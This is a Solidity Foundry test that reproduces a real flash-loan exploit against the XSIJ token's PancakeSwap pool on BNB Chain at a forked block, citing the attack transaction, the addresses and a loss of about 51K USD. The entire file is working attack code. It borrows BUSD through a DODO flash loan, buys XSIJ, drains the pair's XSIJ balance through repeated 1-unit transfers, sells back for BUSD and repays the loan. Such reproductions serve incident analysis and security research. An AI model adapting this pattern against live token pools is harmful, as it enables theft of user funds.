// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~51K USD
// TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xf477089602fefcfc1dbdce15834476267914d64a1e6a52f07d3f135f091e1d27
// Attacker : https://bscscan.com/address/0xc4f82210c2952fcec77efe734ab2d9b14e858469
// Attack Contract : https://bscscan.com/address/0x5313f4f04fdcc2330ccfa5ba7da2780850d1d7be
// GUY : https://x.com/CertiKAlert/status/1752384801535918264

interface IDodo{
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}
interface XSIJ is IERC20{
    function removePoolAmount() external view returns (uint256); 
}
contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    XSIJ Xsij = XSIJ(0x31bfA137C76561ef848c2af9Ca301b60451CaAC0);
    IPancakePair Pair = IPancakePair(0xf43Fd71f404CC450c470d42E3F478a6D38C96311);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);


    function setUp() public {
        cheats.createSelectFork("bsc",35702095);
        deal(address(BUSD),address(this),0 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker USDT balance before exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
        DPP.flashLoan(0, 100000000000000000000000, address(this), new bytes(0x123));
        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        BUSD.approve(address(Router), 100000*1e18);
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(Xsij);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100000*1e18,
            0,
            path,
            address(this),
            block.timestamp + 100
        );
        uint256 i;
        while(Xsij.balanceOf(address(Pair)) >1800 * 1e18){
            Xsij.transfer(address(Pair), 1);
            i++;
        }
        Xsij.approve(address(Router), 10111100000*1e18);
        address[] memory path2 = new address[](2);
        path2[0] = address(Xsij);
        path2[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Xsij.balanceOf(address(this)),
            0,
            path2,
            address(this),
            block.timestamp + 100
        );
        BUSD.transfer(address(msg.sender),quoteAmount);
    }
      function getMyVariable() public view returns (uint256) {
        return Xsij.removePoolAmount();
    }
}